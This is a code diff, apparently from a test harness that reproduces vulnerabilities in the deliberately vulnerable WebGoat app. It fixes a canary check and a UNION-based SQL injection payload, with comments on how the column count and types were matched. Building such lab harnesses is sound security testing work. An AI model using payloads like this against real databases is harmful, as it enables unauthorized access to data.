@@ -108,7 +108,9 @@ function canaryInWebGoatOutput(body: string, canary: string): boolean {
   }
   if (typeof parsed !== "object" || parsed === null) return false;
   const output = (parsed as Record<string, unknown>).output;
-  return typeof output === "string" && output.includes(canary);
+  // The lesson appends "Your query was: <sql>" to every response, which echoes the payload (and so
+  // the canary) even when the injection failed. Only the text before it is query results.
+  return typeof output === "string" && output.split("Your query was:")[0].includes(canary);
 }
 
 /**
@@ -116,11 +118,9 @@ function canaryInWebGoatOutput(body: string, canary: string): boolean {
  * `SELECT ... FROM user_data WHERE last_name = '<account>'`, so a UNION that selects the canary
  * as a literal makes it surface in the lesson's rendered output.
  *
- * Assumption to verify against the built image: the exact lesson path and the UNION column count
- * are WebGoat-version specific. `assignment5a` is the WebGoat 8.x string-injection assignment;
- * confirm both the path and how many columns user_data has, then match the UNION to it. Same
- * form-encoding and authentication gaps as DVWA apply, since WebGoat reads request parameters and
- * gates lessons behind a login.
+ * The path and the UNION were checked against the pinned v2025.3 image. Same form-encoding and
+ * authentication gaps as DVWA apply, since WebGoat reads request parameters and gates lessons
+ * behind a login.
  */
 function webGoatSqlInjectionRecipe(config: WebGoatConfig): ReproductionRecipe {
   return {
@@ -138,10 +138,10 @@ function webGoatSqlInjectionRecipe(config: WebGoatConfig): ReproductionRecipe {
     exploit: {
       method: "POST",
       path: config.sqlInjectionPath,
-      // ponytail: column count assumed to match user_data; the operator confirms it against the
-      // built WebGoat version and adjusts the literal list if the schema differs.
+      // user_data has 7 columns and HSQLDB rejects a type mismatch in a UNION, so the first
+      // (userid) and last (login_count) are integers. Checked live against v2025.3.
       body: {
-        account: `' UNION SELECT '${CANARY_PLACEHOLDER}','x','x','x','x','x','x' FROM INFORMATION_SCHEMA.SYSTEM_USERS--`,
+        account: `' UNION SELECT 1,'${CANARY_PLACEHOLDER}','x','x','x','x',1 FROM INFORMATION_SCHEMA.SYSTEM_USERS--`,
         operator: "",
         injection: "",
       },
